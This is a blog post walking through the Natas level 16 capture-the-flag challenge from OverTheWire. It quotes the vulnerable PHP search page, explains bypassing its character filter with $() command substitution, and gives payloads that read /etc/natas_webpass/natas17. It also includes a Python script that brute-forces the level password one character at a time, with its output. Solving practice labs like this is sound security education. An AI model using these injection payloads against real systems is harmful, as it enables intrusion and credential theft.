---
layout: post
title: "Natas Level16 - Level17"
date: 2015-10-02 21:06:47
image: '/assets/img/'
description:
tags: Natas CTF
categories: Natas
twitter_text:
---
Natas 16 looks similar to the earlier challenges where we were got to search for a word in a flat document. However this time it says "For security reasons, we now filter even more on certain characters":

![Natas 16 search](/assets/img/screenshots/Natas_level16-1.png)

Lets open up the source and see what the difference is:

{% highlight html %}
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
{% endhighlight %}

Here is the regular expression that filters out the words:

{% highlight regex %}
/[;|&`\'"]/
{% endhighlight %}

Basically any of the following characters are now disallowed: ; | & ' \ ' "

So any of our previous strings will not work. I remembered that you can execute commands within a string in bash by adding a: $(<<COMMANDHERE>>). My idea was to run the following code:

{% highlight bash %}
$(grep ^A /etc/natas_webpass/natas17)
{% endhighlight %}

If we run that and the first character is "A" the entire password will be returned. If "A" does not exist, an empty string will be returned. However, this won't work because even if we guess the correct letter grep will return the password and search for the password in the dictionary which does not exist. If we find a word that exists in the dictionary, we would be able to utilize the fact that grep returns an empty string when the letter is not found. Lets first find a word we can use, I just searched for the letter "a":

![Natas 16 search for a](/assets/img/screenshots/Natas_level16-2.png)

I'll use the word "African" and that would mean our query string will look something like:

{% highlight bash %}
    $(grep ^A /etc/natas_webpass/natas17)African
{% endhighlight %}

Next I'll use the Burp Intruder to see if we can get just the first letter:

![Natas 16 search](/assets/img/screenshots/Natas_level16-3.png)

Looks like we got a hit! Now lets use a script. I'll copy most of it from the last challenge:

{% highlight python %}
import urllib
import urllib2
import pprint

url = 'http://natas16.natas.labs.overthewire.org/'
referrer = 'natas15.natas.labs.overthewire.org'
authorization = 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='

Chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r',
's','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L',
'M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5',
'6','7','8','9']

password = ""

#loop through possible length of password
for i in range(1, 33):
    print "%d out of 32" % (i)
    #loop through possible chars
    for j in range(0,len(Chars)):
        grep = '$(grep ^%s /etc/natas_webpass/natas17)African' % (password + Chars[j])
        values = {'needle' : grep,'submit' : 'Search'}
        req = urllib2.Request(url)
        req.add_data(urllib.urlencode(values))
        req.add_header('Referrer', referrer)
        req.add_header('Authorization', authorization)
        try:
            response = urllib2.urlopen(req)
            the_page = response.read()
            #print the_page
        except HTTPError, e:
            print e.reason
        if "African" not in the_page:
            password+=Chars[j]
            print password
            break
{% endhighlight %}

After that's done we get the following output:
    1 out of 32
    8
    2 out of 32
    8P
    3 out of 32
    8Ps
    4 out of 32
    ....
    27 out of 32
    8Ps3H0GWbn5rd9S7GmAdgQNdkhP
    28 out of 32
    8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
    29 out of 32
    8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
    30 out of 32
    8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
    31 out of 32
    8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
    32 out of 32
    8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

